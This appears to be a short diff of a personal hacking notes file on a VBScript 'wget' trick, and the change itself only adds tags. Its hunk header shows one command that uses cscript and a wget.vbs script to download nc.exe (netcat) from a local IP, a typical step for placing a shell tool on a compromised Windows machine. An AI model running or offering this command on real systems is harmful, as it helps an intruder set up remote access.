@@ -9,4 +9,4 @@ cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
 - ~/kb/hacking/tricks/vbscript-wget-hack.md
 
 Tags:
-    #assorted
+    #assorted #hacking #trick #vbscript
